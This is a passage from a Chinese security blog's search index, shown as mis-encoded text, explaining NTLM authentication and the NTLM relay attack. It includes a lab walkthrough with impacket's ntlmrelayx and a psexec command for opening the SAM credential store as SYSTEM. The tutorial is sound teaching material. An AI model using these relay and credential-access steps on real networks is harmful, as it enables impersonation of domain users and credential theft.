Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 æŒ‘æˆ˜ - å“åº”è®¤è¯æœºåˆ¶ æŒ‘æˆ˜/å“åº”æœºåˆ¶çš„ç›®çš„æ˜¯ä¸ºäº†è®©æœåŠ¡å™¨éªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œä¸”ä¸é€šè¿‡ç½‘ç»œä¼ è¾“ç”¨æˆ·å¯†ç ã€‚æ•´ä¸ªè®¤è¯è¿‡ç¨‹æœ‰ä¸‰æ­¥ã€‚ åå•† - Negotiation - type1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€è®¤è¯è¯·æ±‚(NEGOTIATE_MESSAGE) æŒ‘æˆ˜ - Challenge - type2 æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ 64 ä½çš„éšæœºå€¼(CHALLENGE_MESSAGE) å“åº” - Response - type3 å®¢æˆ·ç«¯ä½¿ç”¨å…¶ç”¨æˆ·çš„ NT Hash å€¼å¯¹ Challenge è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™æœåŠ¡ç«¯ ä¸‹å›¾ä¸º 1 æ¬¡ NTLM è®¤è¯è¿‡ç¨‹ï¼š ä¸ºäº†å®Œæˆèº«ä»½éªŒè¯ï¼ŒæœåŠ¡å™¨åªéœ€è¦æ£€æŸ¥å®¢æˆ·ç«¯å‘é€çš„å“åº”çš„æœ‰æ•ˆæ€§ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 è®¤è¯ NT Hash çš„è®¡ç®—ï¼š å…ˆå°†ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ã€‚ å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è¿›è¡Œ Unicode ç¼–ç ã€‚ ä½¿ç”¨ MD4 æ‘˜è¦ç®—æ³•å¯¹ Unicode ç¼–ç æ•°æ®è¿›è¡Œ Hash è®¡ç®— python2 -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new(\"md4\", \"p@Assword!123\".encode(\"utf-16le\")).digest())' å¦‚å‰æ–‡æ‰€è¿°ï¼ŒNTLM è®¤è¯æœ‰ä¸¤ç§ä¸åŒçš„åœºæ™¯ã€‚ 1.3.1 æœ¬åœ°è´¦æˆ· åœ¨ä½¿ç”¨æœ¬åœ°å¸æˆ·å®Œæˆèº«ä»½éªŒè¯çš„åœºæ™¯ä¸‹ï¼ŒæœåŠ¡å™¨ä½¿ç”¨ç”¨æˆ·çš„å¯†é’¥æˆ–ç”¨æˆ·å¯†é’¥çš„ MD4 æ•£åˆ—(NT Hash)å¯¹å…¶å‘é€ç»™å®¢æˆ·ç«¯çš„ Challenge è¿›è¡ŒåŠ å¯†ã€‚ ç„¶åå®ƒä¼šæ£€æŸ¥å®ƒçš„æ“ä½œç»“æœæ˜¯å¦ç­‰äºå®¢æˆ·ç«¯çš„å“åº”ï¼Œè¯æ˜ç”¨æˆ·èº«ä»½ã€‚ æœåŠ¡å™¨éœ€è¦å­˜å‚¨æœ¬åœ°ç”¨æˆ·åŠå…¶å¯†ç çš„å“ˆå¸Œå€¼ã€‚ æ­¤æ•°æ®åº“çš„åç§°æ˜¯ SAMï¼ˆå®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼‰ã€‚ SAM å¯ä»¥åœ¨æ³¨å†Œè¡¨ä¸­æ‰¾åˆ°ï¼Œå¯ä»¥ä½¿ç”¨ psexec ä»¥ SYSTEM èº«ä»½æ‰“å¼€å®ƒï¼š psexec.exe -i -s regedit.exe åœ¨ C:\\Windows\\System32\\SAM ä¸‹ä¹Ÿæœ‰ä¸€ä»½æ‹·è´ã€‚ æ€»ç»“ä¸‹å·¥ä½œç»„ä¸‹çš„è®¤è¯æµç¨‹ï¼š æœåŠ¡å™¨å‘é€ä¸€ä¸ª Challenge (1) å¹¶ä¸”å®¢æˆ·ç«¯ä½¿ç”¨å…¶å¯†é’¥çš„å“ˆå¸Œå€¼åŠ å¯†è¯¥è´¨è¯¢ï¼Œç„¶åä½¿ç”¨å…¶ç”¨æˆ·å¯¹åº”çš„ NT Hash åŠ å¯† Challenge å¹¶å°†å…¶å‘é€å›æœåŠ¡å™¨ (2)ã€‚æœåŠ¡å™¨å°†åœ¨å…¶ SAM ä¸­æŸ¥æ‰¾ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼ (3)ï¼Œ å¹¶åŠ å¯†ä¹‹å‰ç”¨è¿™ä¸ªæ•£åˆ—å‘é€çš„ Challenge (4)ï¼Œå¹¶å°†å…¶ç»“æœä¸ç”¨æˆ·è¿”å›çš„ç»“æœè¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœç›¸åŒ (5) åˆ™ç”¨æˆ·å·²é€šè¿‡èº«ä»½éªŒè¯ï¼Œå¦åˆ™ï¼Œè®¤è¯å¤±è´¥ã€‚ 1.3.2 åŸŸè´¦æˆ· å½“ç”¨åŸŸå¸æˆ·è¿›è¡Œè®¤è¯æ—¶ï¼Œç”¨æˆ·çš„ NT Hash ä¸å†å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šã€‚ç”¨æˆ·è¦è®¤è¯çš„æœåŠ¡å™¨ä¼šæ”¶åˆ°å®¢æˆ·ç«¯å¯¹ Challenge åŠ å¯†çš„å“åº”æŠ¥æ–‡ï¼Œä½†å®ƒä¸èƒ½æ£€æŸ¥è¯¥å“åº”æ˜¯å¦æœ‰æ•ˆï¼Œå› æ­¤ï¼ŒæœåŠ¡ç«¯éœ€è¦æŠŠéªŒè¯èº«ä»½çš„ä»»åŠ¡å§”æ‰˜ç»™åŸŸæ§åˆ¶å™¨ã€‚ ä¸ºæ­¤ï¼Œåœ¨æœåŠ¡ç«¯ä¸åŸŸæ§è¿›è¡Œé€šä¿¡æ—¶ï¼Œä½¿ç”¨äº† Netlogon æœåŠ¡ï¼Œè¯¥æœåŠ¡èƒ½å¤Ÿä¸åŸŸæ§åˆ¶å™¨å»ºç«‹å®‰å…¨ä¼šè¯ï¼Œè¢«ç§°ä¸ºå®‰å…¨é€šé“(Secure Channel)ã€‚ç”±äºæœåŠ¡å™¨çŸ¥é“è‡ªå·±çš„å¯†é’¥ï¼Œè€ŒåŸŸæ§åˆ¶å™¨çŸ¥é“æœåŠ¡å™¨å¯†é’¥çš„å“ˆå¸Œï¼ŒæœåŠ¡ç«¯ä¸åŸŸæ§ä¹‹é—´å¯ä»¥äº¤æ¢ä¼šè¯å¯†é’¥å¹¶å®‰å…¨åœ°é€šä¿¡ã€‚ å®¢æˆ·ç«¯å‘åŸŸæ§å‘é€ NETLOGON_NETWORK_INFOï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬ï¼š typedef struct _NETLOGON_NETWORK_INFO { NETLOGON_LOGON_IDENTITY_INFO Identity; LM_CHALLENGE LmChallenge; STRING NtChallengeResponse; STRING LmChallengeResponse; } NETLOGON_NETWORK_INFO, *PNETLOGON_NETWORK_INFO; å®¢æˆ·ç«¯ç”¨æˆ·å (Identity) æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€çš„ Challenge (LmChallenge) å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€çš„ Response (NtChallengeResponse) åŸŸæ§å°†åœ¨å…¶æ•°æ®åº“ä¸­æŸ¥æ‰¾å¯¹åº”ç”¨æˆ·çš„ NT Hashã€‚å¯¹äºåŸŸæ§åˆ¶å™¨ï¼Œç”¨æˆ·çš„æ•°æ®è¢«å­˜å‚¨åœ¨ NTDS.DIT çš„æ–‡ä»¶ä¸­ã€‚ä¸€æ—¦æ£€ç´¢åˆ° NT Hashï¼Œè®¡ç®— Challenge çš„åŠ å¯†å€¼ï¼Œå¹¶å°†æ­¤ç»“æœä¸å®¢æˆ·ç«¯çš„å“åº”è¿›è¡Œæ¯”è¾ƒã€‚ æ€»ç»“ä¸‹åŸŸç¯å¢ƒä¸‹çš„è®¤è¯æµç¨‹ï¼š å’Œä¹‹å‰çš„æƒ…å†µç±»ä¼¼ï¼ŒæœåŠ¡å™¨å‘é€ä¸€ä¸ªæŒ‘æˆ˜ (1)ï¼Œå®¢æˆ·ç«¯ jsnow ç”¨ NT Hash åŠ å¯†ï¼Œå¹¶å°†å®ƒè¿åŒå®ƒçš„ç”¨æˆ·åå’ŒåŸŸå (2) ä¸€èµ·å‘é€å›æœåŠ¡å™¨ã€‚æœåŠ¡å™¨å°†ä½¿ç”¨ Netlogon æœåŠ¡ (3) å°†æ­¤ä¿¡æ¯å‘é€åˆ°å®‰å…¨é€šé“ä¸­çš„åŸŸæ§åˆ¶å™¨ã€‚åŸŸæ§åˆ¶å™¨åœ¨å…¶ NTDS.DIT æ•°æ®åº“ (4) ä¸­æ‰¾åˆ°ç”¨æˆ·æ•£åˆ—æ¥åŠ å¯† Challengeï¼Œç„¶åå°†ä¸¤ä¸ªç»“æœè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ˜¯ç›¸åŒçš„ (5)ï¼Œåˆ™ç”¨æˆ·å·²é€šè¿‡èº«ä»½éªŒè¯ã€‚ å¦åˆ™è®¤è¯å¤±è´¥ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼ŒåŸŸæ§åˆ¶å™¨éƒ½ä¼šå°†ä¿¡æ¯ä¼ è¾“åˆ°æœåŠ¡å™¨ (6)ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 å‡ ç§ Hash ä¸ºäº†é¿å…æ··æ·†ï¼Œæ€»ç»“ä¸‹ç›¸å…³ Hash çš„åè¯ï¼š NT Hash å’Œ LM Hash æ˜¯ç”¨æˆ·å¯†ç çš„æ•£åˆ—ç‰ˆæœ¬ã€‚ LM Hash å·²ç»å®Œå…¨è¿‡æ—¶ï¼Œæœ¬æ–‡ä¸å†è®¨è®ºã€‚NT Hash é€šå¸¸åˆè¢«ç§°ä¸º NTLM Hashã€‚æ­¤åç§°ä¸åè®®åç§° NTLM å­˜åœ¨æ··æ·†ã€‚å› æ­¤ï¼Œå½“è°ˆè®ºç”¨æˆ·çš„å¯†ç å“ˆå¸Œæ—¶ï¼Œå°†å…¶ç§°ä¸º NT Hashã€‚ NTLM æ˜¯èº«ä»½éªŒè¯åè®®çš„åç§°ã€‚ç›®å‰æœ‰ä¸¤ä¸ªç‰ˆæœ¬çš„ NTLM åè®®ã€‚ NTLMv1 å“åº”å’Œ NTLMv2 å“åº”å°†æ˜¯ç”¨äºæŒ‡ä»£å®¢æˆ·ç«¯å‘é€çš„ Challenge å“åº”çš„æœ¯è¯­ï¼Œé€‚ç”¨äº NTLM åè®®çš„ç‰ˆæœ¬ 1 å’Œ 2ã€‚ Net-NTLMv1 å’Œ Net-NTLMv2 æ˜¯å½“ NT Hash ç§°ä¸º NTLM å“ˆå¸Œæ—¶ä½¿ç”¨çš„ä¼ªæ–°æœ¯è¯­ï¼Œç”¨äºå°† NTLM Hashä¸åè®®åŒºåˆ†å¼€æ¥ã€‚ç”±äºæˆ‘ä»¬ä¸ä½¿ç”¨ NTLM Hash æœ¯è¯­ï¼Œå› æ­¤ä¸ä¼šä½¿ç”¨è¿™ä¸¤ä¸ªæœ¯è¯­ã€‚ Net-NTLMv1 Hash å’Œ Net-NTLMv2 Hash ä¹Ÿæ˜¯é¿å…æ··æ·†çš„æœ¯è¯­ï¼Œä½†ä¹Ÿä¸ä¼šåœ¨æœ¬æ–‡ä¸­ä½¿ç”¨ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 ç®€ä»‹ é¡¾åæ€ä¹‰ï¼ŒNTLM Relay æ”»å‡»ä¾èµ–äº NTLM èº«ä»½éªŒè¯ã€‚æ”»å‡»å­˜åœ¨ä¸‹é¢çš„åœºæ™¯ä¸­ï¼šæ”»å‡»è€…è®¾æ³•åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å¤„äºä¸­é—´äººçš„ä½ç½®ï¼Œå¹¶ç®€å•åœ°å°†ä¿¡æ¯ä»ä¸€ç«¯è½¬å‘åˆ°å¦ä¸€ç«¯ã€‚ ä¸­é—´äººçš„ä½ç½®æ„å‘³ç€ï¼šä»å®¢æˆ·ç«¯çš„è§’åº¦æ¥çœ‹ï¼Œæ”»å‡»è€…çš„æœºå™¨æ˜¯ä»–æƒ³è¦è®¤è¯çš„æœåŠ¡å™¨ï¼Œè€Œä»æœåŠ¡å™¨çš„è§’åº¦æ¥çœ‹ï¼Œæ”»å‡»è€…æ˜¯ä¸€ä¸ªåƒå…¶ä»–æƒ³è¦è®¤è¯è®¿é—®èµ„æºçš„å®¢æˆ·ç«¯ã€‚ å½“ç„¶ï¼Œæ”»å‡»è€…å¹¶ä¸åªæ˜¯æƒ³å¯¹ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œè®¤è¯ï¼Œè€Œæ˜¯ä¼ªé€ æˆå—å®³çš„ç”¨æˆ·èº«ä»½æ¥æ§åˆ¶æœåŠ¡ç«¯ã€‚ä½†æ˜¯ï¼Œç”±äºæ”»å‡»è€…ä¸çŸ¥é“ç”¨æˆ·çš„å¯†é’¥ï¼Œå³ä½¿ä»–ç›‘å¬äº†å¯¹è¯ï¼Œç”±äºè¿™ä¸ªå¯†é’¥ä»æœªåœ¨ç½‘ç»œä¸Šä¼ è¾“ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•æå–ä»»ä½•ä¿¡æ¯ã€‚é‚£ä¹ˆï¼Œå®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„å‘¢ï¼Ÿ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 æ¶ˆæ¯ä¸­ç»§ åœ¨ NTLM è®¤è¯è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç”¨å…¶ NT Hash åŠ å¯†æœåŠ¡å™¨æä¾›çš„ Challenge æ¥å‘æœåŠ¡å™¨è¯æ˜å…¶èº«ä»½ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å”¯ä¸€è¦åšçš„å°±æ˜¯è®©å®¢æˆ·ç«¯åšå¥½åŠ å¯†ï¼Œå¹¶æŠŠä¿¡æ¯ä»å®¢æˆ·ç«¯ä¼ ç»™æœåŠ¡å™¨ï¼Œä»¥åŠæŠŠæœåŠ¡å™¨çš„å›å¤ä¼ ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ”»å‡»è€…éƒ½ä¼šæ”¶åˆ°ï¼Œå¹¶æŠŠä¿¡æ¯é‡æ”¾ç»™çœŸæ­£çš„æœåŠ¡å™¨ã€‚è€ŒæœåŠ¡å™¨å‘å®¢æˆ·å‘é€çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ”»å‡»è€…ä¹Ÿä¼šæ”¶åˆ°ï¼Œå¹¶å°†å…¶åŸå°ä¸åŠ¨çš„è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ å®é™…ä¸Šï¼Œä»å®¢æˆ·çš„è§’åº¦æ¥çœ‹ï¼Œåœ¨å›¾çš„å·¦ä¾§ï¼Œæ”»å‡»è€…å’Œå®ƒä¹‹é—´è¿›è¡Œäº† NTLM èº«ä»½éªŒè¯ã€‚ å®¢æˆ·ç«¯åœ¨å…¶ç¬¬ä¸€æ¡æ¶ˆæ¯ä¸­å‘é€åå•†è¯·æ±‚ï¼Œæ”»å‡»è€…ä»¥ Challenge å›å¤è¯¥è¯·æ±‚ã€‚ æ”¶åˆ°æ­¤ Challenge åï¼Œå®¢æˆ·ç«¯ä½¿ç”¨å…¶å¯†é’¥æ„å»º Responseï¼Œå¹¶æœ€ç»ˆå‘é€åŒ…å«åŠ å¯†è´¨è¯¢çš„æœ€åä¸€æ¡èº«ä»½éªŒè¯æ¶ˆæ¯ã€‚ ä½†æ˜¯ï¼Œæ”»å‡»è€…ä¸èƒ½ç”¨è¿™ä¸ªäº¤æ¢åšä»»ä½•äº‹æƒ…ã€‚å› æ­¤ï¼Œéœ€è¦æ€è·¯è½¬å‘ä¸Šå›¾çš„å³åŠè¾¹ã€‚å®é™…ä¸Šï¼Œä»æœåŠ¡å™¨çš„è§’åº¦æ¥çœ‹ï¼Œæ”»å‡»è€…æ˜¯ä¸€ä¸ªå’Œå…¶å®ƒç”¨æˆ·ä¸€æ ·çš„å®¢æˆ·ç«¯ã€‚å®ƒå‘é€äº†ç¬¬ä¸€æ¡æ¶ˆæ¯è¦æ±‚è®¤è¯ï¼Œè€ŒæœåŠ¡å™¨ç”¨æŒ‘æˆ˜æ¥å›åº”ã€‚ç”±äºæ”»å‡»è€…å‘çœŸæ­£çš„å®¢æˆ·å‘é€äº†è¿™ä¸ªåŒæ ·çš„ Challengeï¼ŒçœŸæ­£çš„å®¢æˆ·ç«¯ç”¨å®ƒçš„å¯†é’¥å¯¹è¿™ä¸ªæŒ‘æˆ˜è¿›è¡Œäº†åŠ å¯†ï¼Œå¹¶ä»¥ä¸€ä¸ªæœ‰æ•ˆçš„å“åº”è¿›è¡Œå›å¤ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘æœåŠ¡å™¨å‘é€è¿™ä¸ªæœ‰æ•ˆçš„å“åº”ã€‚ è¿™å°±æ˜¯æ”»å‡»çš„ç‚¹æ‰€åœ¨ã€‚ä»æœåŠ¡å™¨çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒä¸çŸ¥é“æ”»å‡»è€…æ­£åœ¨å‘å®¢æˆ·é‡æ”¾å…¶ä¿¡æ¯ã€‚ å› æ­¤ï¼Œä»æœåŠ¡å™¨çš„è§’åº¦æ¥çœ‹ï¼Œè¿™å°±æ˜¯æ‰€å‘ç”Ÿçš„äº‹æƒ…ï¼š åœ¨è¿™äº›äº¤æ¢ç»“æŸæ—¶ï¼Œæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨å®¢æˆ·ç«¯çš„å‡­æ®è¿›è¡Œèº«ä»½éªŒè¯ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.4 Net-NTLMv1 and Net-NTLMv2 æ”»å‡»è€…åœ¨ type 3 ä¸­è½¬å‘çš„è¿™ä¸ªæœ‰æ•ˆå“åº”ï¼Œé€šå¸¸ç§°ä¸º Net-NTLMv1 Hash æˆ– Net-NTLMv2 Hashã€‚ ä½†åœ¨æœ¬æ–‡ä¸­ï¼Œå®ƒå°†è¢«ç§°ä¸º NTLMv1 å“åº”æˆ– NTLMv2 å“åº”ï¼Œå¦‚å‰æ–‡æ‰€è¿°ã€‚ ç¡®åˆ‡åœ°è¯´ï¼Œè¿™å¹¶ä¸æ˜¯ Challenge çš„åŠ å¯†ç‰ˆæœ¬ï¼Œè€Œæ˜¯ä½¿ç”¨å®¢æˆ·ç«¯å¯†é’¥è®¡ç®—å‡ºçš„å“ˆå¸Œå€¼ã€‚ ä»¥ NTLMv2 ä¸ºä¾‹ï¼ŒNTLMv2 Hash = HMAC-MD5(unicode(hex(upper(username+domain))), NT Hash)ï¼Œè¿™ç§ç±»å‹çš„å“ˆå¸Œåªèƒ½ç”¨æš´åŠ›ç ´è§£ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 å®æˆ˜ IP åœ°å€ä¸º 192.168.56.221 çš„ DESKTOP01 å®¢æˆ·ç«¯å’Œ IP åœ°å€ä¸º 192.168.56.211 çš„ WEB01 æœåŠ¡å™¨ã€‚ IP åœ°å€ä¸º 192.168.56.1 ä¸ºä¸­é—´äººã€‚æ”»å‡»åœºæ™¯å¦‚ä¸‹ï¼š ä½¿ç”¨ impacket åŒ…ä¸­çš„ ntlmrelayx è¿›è¡Œæ”»å‡»ã€‚ python ntlmrelayx.py -t 192.168.56.221 ç½‘ç»œæµé‡å¦‚ä¸‹ï¼š ç»¿è‰²çš„æ˜¯ DESKTOP01 å®¢æˆ·ç«¯å’Œæ”»å‡»è€…ä¹‹é—´çš„æµé‡ï¼Œçº¢è‰²æ˜¯æ”»å‡»è€…å’Œ WEB01 æœåŠ¡å™¨ä¹‹é—´çš„æµé‡ã€‚ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ° DESKTOP01 å’Œæ”»å‡»è€…ä¹‹é—´ä»¥åŠæ”»å‡»è€…å’Œ WEB01 æœåŠ¡å™¨ä¹‹é—´çš„ 3 æ¡ NTLM æ¶ˆæ¯ã€‚ ä¸ºäº†ç†è§£ä¸­ç»§çš„æ¦‚å¿µï¼Œé€šè¿‡éªŒè¯å½“ WEB01 å‘æ”»å‡»è€…å‘é€è´¨è¯¢æ—¶ï¼Œæ”»å‡»è€…å‘ DESKTOP01 å‘é€å›å®Œå…¨ç›¸åŒçš„å†…å®¹ã€‚ è¿™æ˜¯ WEB01 å‘æ”»å‡»è€…å‘é€çš„ Challengeï¼š å½“æ”»å‡»è€…æ”¶åˆ°è¿™ä¸ªæŒ‘æˆ˜æ—¶ï¼Œå®ƒä¸åŠ ä»»ä½•ä¿®æ”¹åœ°å°†å…¶å‘é€åˆ° DESKTOP01ã€‚ åœ¨ä¸Šé¢çš„è¿‡ç¨‹ä¸­ï¼ŒChallenge å€¼æ˜¯ b6515172c37197b0ã€‚ ç„¶åå®¢æˆ·ç«¯å°†ä½¿ç”¨å®ƒçš„å¯†é’¥æ¥è®¡ç®—å“åº”ï¼Œå°†è®¡ç®—å¥½çš„å“åº”å€¼è¿åŒç”¨æˆ·å (jsnow)ã€ä¸»æœºå (DESKTOP01) ä¸€èµ·å‘é€ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ä¸€ä¸ªåŸŸç”¨æˆ·ï¼Œå› æ­¤ä¸»æœºåæ˜¯æœ¬åŸŸçš„åŸŸå (ADSEC)ã€‚ å¾—åˆ° Response çš„æ”»å‡»è€…å°†å®Œå…¨ç›¸åŒçš„ä¿¡æ¯å‘é€åˆ°æœåŠ¡å™¨ã€‚äºæ˜¯ä¸­é—´äººå†’å……äº† DESKTOP01 ä¸Šçš„ jsnowï¼Œæ˜¯ ADSEC åŸŸçš„åŸŸç”¨æˆ·ï¼Œå®ƒè¿˜å‘é€äº†å®¢æˆ·ç«¯è®¡ç®—å‡ºæ¥çš„å“åº”ï¼Œåœ¨è¿™äº›æˆªå›¾ä¸­ç§°ä¸º NTLM å“åº”ã€‚å°†æ­¤å“åº”ç§°ä¸º NTLMv2 Hashã€‚ ä»æµé‡ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œæ”»å‡»è€…åªæ˜¯åœ¨è½¬å‘æ•°æ®ã€‚ å®ƒåªæ˜¯å°†å®¢æˆ·ç«¯çš„ä¿¡æ¯è½¬å‘ç»™æœåŠ¡å™¨ï¼Œåä¹‹äº¦ç„¶ï¼Œåªä¸è¿‡æœ€åæœåŠ¡å™¨è®¤ä¸ºæ”»å‡»è€…è®¤è¯æˆåŠŸï¼Œç„¶åæ”»å‡»è€…å°±å¯ä»¥ä»£è¡¨ ADSEC\\jsnow åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ“ä½œã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 è®¤è¯ä¸ä¼šè¯ ä¸Šæ–‡é˜è¿°äº† NTLM ä¸­ç»§çš„åŸºæœ¬åŸç†ï¼Œæ¥ä¸‹æ¥å‡ºç°çš„é—®é¢˜æ˜¯ï¼Œåœ¨ä¸­ç»§ NTLM èº«ä»½éªŒè¯åï¼Œå¦‚ä½•åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…·ä½“åœ°æ“ä½œï¼Ÿ è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»é¦–å…ˆæ¾„æ¸…ä¸€ä¸ªåŸºæœ¬çš„äº‹å®ã€‚å½“å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ä»¥æ‰§è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œå¿…é¡»åŒºåˆ†ä¸¤ä»¶äº‹ï¼š èº«ä»½éªŒè¯(Authentication)ï¼Œå…è®¸æœåŠ¡å™¨éªŒè¯å®¢æˆ·ç«¯æ˜¯å®ƒå£°ç§°çš„èº«ä»½ã€‚ ä¼šè¯(Session)ï¼Œåœ¨æ­¤æœŸé—´å®¢æˆ·ç«¯å°†èƒ½å¤Ÿæ‰§è¡Œæ“ä½œã€‚ å¦‚æœå®¢æˆ·ç«¯é€šè¿‡äº†æ­£ç¡®çš„èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆå®ƒå°†èƒ½å¤Ÿè®¿é—®æœåŠ¡å™¨æä¾›çš„èµ„æºï¼Œä¾‹å¦‚ç½‘ç»œå…±äº«ã€å¯¹ LDAP ç›®å½•çš„è®¿é—®ã€HTTP æœåŠ¡å™¨æˆ– SQL æ•°æ®åº“ç­‰ç­‰ã€‚ ä¸ºäº†ç®¡ç†è¿™ä¸¤ä¸ªæ­¥éª¤ï¼Œæ‰€ä½¿ç”¨çš„åè®®å¿…é¡»èƒ½å¤Ÿå°è£…èº«ä»½éªŒè¯ï¼Œä»è€Œäº¤æ¢ NTLM æ¶ˆæ¯ã€‚ å¦‚æœæ‰€æœ‰åè®®éƒ½é›†æˆ NTLM æŠ€æœ¯ç»†èŠ‚ï¼Œæ˜¯ä¸ç¬¦åˆè½¯ä»¶å·¥ç¨‹ä¸­çš„è§£è€¦æ€æƒ³çš„ã€‚å› æ­¤ï¼Œå¾®è½¯æä¾›äº†ä¸€ä¸ªæ¥å£æ¥å¤„ç†èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”ä¸“é—¨å¼€å‘äº†åŒ…æ¥å¤„ç†ä¸åŒç±»å‹çš„èº«ä»½éªŒè¯ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 SSPI \u0026 NTLNSSP SSPI æ¥å£(Security Support Provider Interface)æ˜¯ Microsoft æå‡ºçš„ç”¨äºæ ‡å‡†åŒ–èº«ä»½éªŒè¯çš„æ¥å£ï¼Œä¸åŒçš„åè®®éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¥å£æ¥å¤„ç†ä¸åŒç±»å‹çš„èº«ä»½éªŒè¯è¿‡ç¨‹ã€‚åœ¨ NTLM è®¤è¯ä¸­ï¼Œä½¿ç”¨çš„æ˜¯ NTLMSSPï¼ˆNTLM å®‰å…¨æ”¯æŒæä¾›ç¨‹åºï¼‰ã€‚ SSPI æ¥å£æä¾›äº†å‡ ä¸ªå‡½æ•°ï¼ŒåŒ…æ‹¬ AcquireCredentialsHandleã€InitializeSecurityContext å’Œ AcceptSecurityContextã€‚åœ¨ NTLM èº«ä»½éªŒè¯æœŸé—´ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½ä¼šä½¿ç”¨åˆ°è¿™äº›å‡½æ•°ã€‚ç®€è¿°è¿™äº›æ­¥éª¤ï¼š å®¢æˆ·ç«¯è°ƒç”¨ AcquireCredentialsHandle è·å¾—å¯¹ç”¨æˆ·å‡­æ®çš„é—´æ¥è®¿é—®ã€‚ å®¢æˆ·ç«¯ç„¶åè°ƒç”¨ InitializeSecurityContextï¼Œè¯¥å‡½æ•°åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶å°†åˆ›å»ºç±»å‹ä¸º NEGOTIATE çš„ type 1 æ¶ˆæ¯ã€‚å¯¹äºç 